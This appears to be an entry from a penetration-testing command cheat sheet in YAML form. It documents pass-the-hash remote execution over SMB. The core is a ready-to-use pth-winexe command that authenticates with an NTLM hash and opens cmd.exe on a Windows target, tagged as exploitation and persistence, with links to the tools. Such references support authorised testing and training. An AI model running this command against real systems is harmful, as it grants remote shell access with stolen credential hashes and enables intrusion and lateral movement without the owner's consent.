---
description: Execute commands remotely over SMB using winexe with NTLM Pass-the-Hash.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  pth-winexe -U john%00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396 //10.10.10.1 cmd.exe

items:
  - Hash

services:
  - NTLM

OS:
  - Windows

attack_types:
  - Exploitation
  - Persistence

references:
  - https://github.com/ahmedkhlief/winexe
  - https://github.com/byt3bl33d3r/pth-toolkit
  - https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview
---
